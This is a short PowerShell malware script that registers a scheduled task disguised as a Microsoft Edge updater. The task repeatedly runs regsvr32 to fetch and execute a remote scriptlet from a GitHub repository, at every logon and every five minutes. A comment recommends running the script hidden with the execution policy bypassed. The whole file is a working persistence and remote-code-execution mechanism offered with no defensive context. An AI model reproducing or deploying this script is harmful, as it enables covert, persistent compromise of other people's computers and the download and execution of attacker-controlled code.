# TIP: invoke with `powershell.exe -w hidden -nop -ExecutionPolicy Bypass -Command`

$taskName = "MicrosoftEdgeUpdateUpdaterTaskMachineCore"
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Start-ScheduledTask -TaskName $taskName
} else {
    $action = New-ScheduledTaskAction -Execute "regsvr32.exe" -Argument "/s /n /u /i:https://raw.githubusercontent.com/b3at1/eviluwu/refs/heads/main/WPXService.wsc scrobj.dll"
    $trigger1 = New-ScheduledTaskTrigger -AtLogOn
    $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([TimeSpan]::MaxValue)
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($trigger1, $trigger2) -Force
}